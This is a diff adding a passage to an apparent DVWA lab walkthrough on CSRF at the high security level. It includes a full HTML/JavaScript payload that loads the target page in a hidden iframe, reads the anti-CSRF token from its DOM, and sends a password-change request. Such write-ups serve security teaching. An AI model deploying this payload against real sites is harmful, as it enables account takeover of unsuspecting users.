@@ -274,13 +274,47 @@ password changed.
 
 **Security level is currently: high.**
 
+This time it use csrf token. we can read this token if we have same origin and we can do that by uploading our payload to server as shown previously.
 
+upload this code to server:
 
+<details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
+  
+```html
+<html>
+ <body>
+  <p>TOTALLY LEGITIMATE AND SAFE WEBSITE </p>
+  <iframe id="myFrame" src="http://192.168.170.131/vulnerabilities/csrf" style="visibility: hidden;" onload="maliciousPayload()"></iframe>
+  <script>
+   function maliciousPayload() {
+    console.log("start");
+    var iframe = document.getElementById("myFrame");
+    var doc = iframe.contentDocument  || iframe.contentWindow.document;
+    var token = doc.getElementsByName("user_token")[0].value;
+const http = new XMLHttpRequest();
+    const url = "http://192.168.170.131/vulnerabilities/csrf/?password_new=hackerman&password_conf=hackerman&Change=Change&user_token="+token+"#";
+    http.open("GET", url);
+    http.send();
+    console.log("password changed");
+   }
+  </script>
+ </body>
+</html>
+```
 
+</details>
+
+on visiting this url it will read token from DOM and create password change request to server.
+
+<img width="478" alt="image" src="https://user-images.githubusercontent.com/79740895/185408922-c1d9e774-3e43-4170-bcda-3c0269fc6260.png">
+
+<br/>
 
 ---
 
 ### File Inclusion
+
+
 
 ---
 
